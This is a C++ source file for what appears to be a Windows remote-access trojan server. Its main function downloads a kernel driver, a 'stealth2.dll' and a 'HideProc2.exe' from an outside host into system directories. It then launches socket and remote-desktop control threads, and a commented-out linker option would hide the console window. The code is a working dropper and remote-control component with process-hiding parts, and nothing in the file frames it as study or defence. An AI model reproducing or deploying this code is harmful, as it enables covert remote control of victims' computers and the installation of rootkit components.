#include "MLHT_SERVER.h"
#include "Thread_Socket.h"
#include "Thread_RC.h"


#include <Urlmon.h>
#pragma comment (lib, "urlmon.lib")


//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )


MLHT_SERVER* ms;		//MLHT 服务器
MLHT_SERVER* ms_rc;		//MLHT 远程桌面服务器


struct ThreadInfo
{
	int    serial;
	char   entity;
	double delay;
	double persist;
};


void CreateThread(){
	DWORD n_thread = 0;  
	DWORD thread_ID ;	 
 
	HANDLE	h_Thread[2];

	int a = 0;

	h_Thread[0] = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(Thread_Socket),
	&a,0,&thread_ID);

	h_Thread[1] = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(Thread_RemoteDesktop),
	&a,0,&thread_ID);

	
  	WaitForMultipleObjects(2,h_Thread,TRUE,-1);
}


int main(){
	//URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/msvcp100d.dll","c:\\windows\\system32\\msvcp100d.dll",0,0);
	URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/cccc.sys","c:\\windows\\system32\\drivers\\cccc.sys",0,0);
	URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/stealth2.dll","c:\\windows\\system32\\stealth2.dll",0,0);
	URLDownloadToFile(NULL,"http://13xinan.com/cucyue3/HideProc2.exe","c:\\HideProc2.exe",0,0);
	CreateThread();
	return 0;
}
